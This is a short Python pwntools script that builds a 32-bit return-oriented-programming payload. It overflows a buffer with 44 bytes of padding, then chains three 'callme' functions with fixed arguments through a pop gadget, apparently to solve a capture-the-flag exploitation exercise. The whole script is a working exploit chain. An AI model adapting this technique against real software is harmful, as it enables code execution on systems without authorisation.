from pwn import *

callme_one = 0x80484f0
callme_two = 0x8048550
callme_three = 0x80484e0

pop3 = 0x080487f9

args0 = 0xdeadbeef
args1 = 0xcafebabe
args2 = 0xd00df00d

payload = cyclic(44)

payload += p32(callme_one) + p32(pop3) + p32(args0) + p32(args1) + p32(args2)
payload += p32(callme_two) + p32(pop3) + p32(args0) + p32(args1) + p32(args2)
payload +=  p32(callme_three) + b'AAAA' +  p32(args0) + p32(args1) + p32(args2)

print(payload)
#with open('payload','wb') as f: f.write(payload)
    
